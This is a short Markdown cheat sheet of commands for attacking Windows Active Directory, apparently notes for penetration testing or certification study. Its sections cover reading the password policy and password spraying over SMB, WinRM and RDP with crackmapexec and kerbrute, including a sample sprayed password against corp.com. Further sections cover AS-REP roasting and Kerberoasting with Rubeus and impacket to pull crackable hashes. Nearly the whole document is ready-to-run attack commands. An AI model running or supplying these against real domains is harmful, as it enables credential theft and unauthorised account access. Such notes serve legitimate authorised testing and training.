#### Check Policy
```
crackmapexec <ip> -u <user> -p <password> --pass-pol
enum4linux -u <user> -p <pass> -P <ip>
net accounts
```
#### Spray
```
#Windows
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

#Linux
crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
crackmapexec winrm <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
crackmapexec rdp <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
impacket-smbclient '<domain>/<user>:<password>@<ip>'
```
#### AS-REP Roasting
```
#Gets all users.
impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>

#Roasting
.\Rubeus.exe asreproast /nowrap
impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>
```
#### Kerberoasting
```
#Roasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
impacket-GetUserSPNs --request -dc-ip <ip> <domain>/<user>:<password>
```